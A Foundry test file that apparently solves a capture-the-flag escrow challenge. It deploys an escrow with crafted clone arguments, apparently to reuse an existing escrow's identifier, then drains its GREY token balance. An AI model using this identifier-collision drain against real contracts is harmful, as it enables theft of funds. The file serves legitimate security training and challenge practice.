// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Setup as Challenge} from "../../src/escrow/Setup.sol";
import {EscrowFactory} from "../../src/escrow/EscrowFactory.sol";
import {GREY} from "../../src/escrow/lib/GREY.sol";
import {Clone} from "../../src/escrow/lib/Clone.sol";

interface IEscrow {
    function escrowId() external view returns (uint256);
    function owner() external view returns (address);
    function initialize() external;
    function withdraw(bool isTokenX, uint256 amount) external;
}

contract SolutionTest is Test {
    Challenge internal challenge;
    EscrowFactory public factory;
    GREY public grey;

    address public escrow;
    uint256 public escrowId;

    address public escrow1;
    uint256 public escrowId1;

    function setUp() public {
        challenge = new Challenge();
        factory = challenge.factory();
        escrow = challenge.escrow();
        grey = challenge.grey();
        escrowId = challenge.escrowId();
    }

    function testExploit() public {
        uint256 implId = 0;
        bytes memory args = abi.encodePacked(address(grey), hex"00000000000000000000000000000000000000");
        (escrowId1, escrow1) = factory.deployEscrow(implId, args);

        uint256 amount = grey.balanceOf(escrow);
        bool isTokenX = true;
        IEscrow(escrow).withdraw(isTokenX, amount);

        assertTrue(challenge.isSolved());
    }
}

// We can not use this method as there is access control for `EscrowFactory::addImplementation`
contract FakeEscrow is Clone {
    bytes32 public constant IDENTIFIER = keccak256("ESCROW_SINGLE_ASSET");
    uint256 public escrowId;

    function initialize() external {
        (address factory, address tokenX, address tokenY) = _getArgs();
        escrowId = uint256(keccak256(abi.encodePacked(IDENTIFIER, factory, tokenX, tokenY)));
    }

    function _getArgs() internal pure returns (address factory, address tokenX, address tokenY) {
        factory = _getArgAddress(0);
        tokenX = _getArgAddress(20);
        tokenY = _getArgAddress(40);
    }
}
